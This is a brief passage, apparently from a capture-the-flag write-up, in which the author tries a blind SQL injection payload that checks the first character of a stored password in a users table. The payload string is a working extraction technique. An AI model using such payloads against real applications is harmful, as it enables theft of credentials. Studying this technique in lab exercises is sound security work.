Knowing the typical structure of the flags, I decide to try to see if the query 
```
' OR SUBSTR((SELECT password FROM users LIMIT 1),1,1) = 'p' --
```
works for "p".
